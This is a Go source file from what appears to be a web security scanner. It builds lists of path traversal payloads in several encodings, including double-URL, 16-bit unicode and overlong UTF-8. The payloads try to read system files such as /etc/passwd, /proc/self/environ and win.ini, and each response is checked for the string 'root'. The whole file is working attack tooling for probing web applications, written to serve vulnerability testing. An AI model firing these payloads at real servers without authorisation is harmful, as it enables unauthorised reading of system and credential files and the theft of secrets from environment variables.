package payloads

import (
	"regexp"
	"strings"

	"github.com/rs/zerolog/log"
)

// TemplateLanguagePayload Holds a payload and a regex pattern to verify it
type PathTraversalPayload struct {
	BasePayload
	Value string
	Regex string
}

// MatchAgainstString Checks if the payload match against a string
func (p PathTraversalPayload) MatchAgainstString(text string) (bool, error) {
	return regexp.MatchString(p.Regex, text)
}

// GetValue gets the payload value
func (p PathTraversalPayload) GetValue() string {
	return p.Value
}

// GetPathTraversalPayloads generates a list of path transversals payloads for a target platform
func GetPathTraversalPayloads(depth int, platform string) (payloads []PathTraversalPayload) {
	// It's just the basic logic, should still build the payloads

	switch platform {
	case "unix":
		files := getPathTraversalFilesToTest()["unix"]
		for _, fn := range files {
			payloads = append(payloads, PathTraversalPayload{
				Value: fn,
				Regex: "root", // Temporal
			})
			for _, payload := range buildPathTraversalPayloads(fn, "unix", depth) {
				payloads = append(payloads, PathTraversalPayload{
					Value: payload,
					Regex: "root",
				})
			}
		}
	case "windows":
		files := getPathTraversalFilesToTest()["windows"]
		for _, fn := range files {
			payloads = append(payloads, PathTraversalPayload{
				Value: fn,
				Regex: "root", // Temporal
			})
			for _, payload := range buildPathTraversalPayloads(fn, "windows", depth) {
				payloads = append(payloads, PathTraversalPayload{
					Value: payload,
					Regex: "root",
				})
			}
		}
	default:
		for filePlatform, files := range getPathTraversalFilesToTest() {
			for _, fn := range files {
				payloads = append(payloads, PathTraversalPayload{
					Value: fn,
					Regex: "root", // Temporal
				})
				// payloads = append(payloads, fn)
				// payloads = append(payloads, buildPathTraversalPayloads(fn, file_platform, depth)...)
				for _, payload := range buildPathTraversalPayloads(fn, filePlatform, depth) {
					payloads = append(payloads, PathTraversalPayload{
						Value: payload,
						Regex: "root",
					})
				}
			}
		}
	}
	log.Info().Int("total", len(payloads)).Msg("Path traversal payloads generated")
	return payloads
}

type PathTraversalCharacters struct {
	dot       string
	slashWin  string
	slashUnix string
	encoding  string
	prefixes  []string
	suffixes  []string
}

func getPathTraversalFilesToTest() map[string][]string {
	// Should be updated to provide the matchers
	return map[string][]string{
		"unix":    {"/etc/passwd", "/etc/issue", "/proc/self/environ"},
		"windows": {"boot.ini", `\windows\win.ini`, `winnt/win.ini`, `\windows\system32\drivers\etc\hosts`},
		//"java":    {"WEB-INF/web.xml"},
		//"php":     {"config.inc.php"},
	}
}

func getPathTraversalCharacters() (results []PathTraversalCharacters) {
	results = append(results, PathTraversalCharacters{
		dot:       ".",
		slashUnix: "/",
		slashWin:  `\`,
		prefixes: []string{
			"..",
		},
	})
	results = append(results, PathTraversalCharacters{
		dot:       "..",
		slashUnix: `//`,
		slashWin:  "\\",
		encoding:  "double-url",
		prefixes: []string{
			"..",
		},
	})
	results = append(results, PathTraversalCharacters{
		dot:       "%u002e",
		slashUnix: "%u2215",
		slashWin:  `%u2216`,
		encoding:  "16-bits-unicode",
		prefixes: []string{
			"..",
			".%u002e",
		},
	})
	results = append(results, PathTraversalCharacters{
		dot:       "%e0%40%ae",
		slashUnix: "%e0%80%af",
		slashWin:  `%c0%80%5c`,
		encoding:  "utf-8-unicode",
		prefixes: []string{
			"..",
			"%e0%40%ae.",
		},
	})
	results = append(results, PathTraversalCharacters{
		dot:       "%252e.",
		slashUnix: `%252f/`,
		slashWin:  "%255c/",
		encoding:  "double-url-encoding",
		prefixes: []string{
			"..",
		},
	})
	return results
}

func buildPathTraversalPayloads(filename string, platform string, depth int) (payloads []string) {
	for _, enc := range getPathTraversalCharacters() {
		for i := 0; i <= depth; i++ {
			switch platform {
			case "windows":
				for _, prefix := range enc.prefixes {
					payload := buildPathTraversalPayload(prefix, enc.dot, enc.slashWin, filename, i)
					payloads = append(payloads, payload)

				}
			default:
				for _, prefix := range enc.prefixes {
					payload := buildPathTraversalPayload(prefix, enc.dot, enc.slashUnix, filename, i)
					payloads = append(payloads, payload)
				}
			}
		}
	}
	return payloads
}

func buildPathTraversalPayload(starting string, dot string, slash string, filename string, depth int) string {
	var payload strings.Builder

	payload.WriteString(starting)
	for i := 0; i < depth; i++ {
		payload.WriteString(slash)
		payload.WriteString(dot)
		payload.WriteString(dot)
	}
	payload.WriteString(filename)
	return payload.String()
}
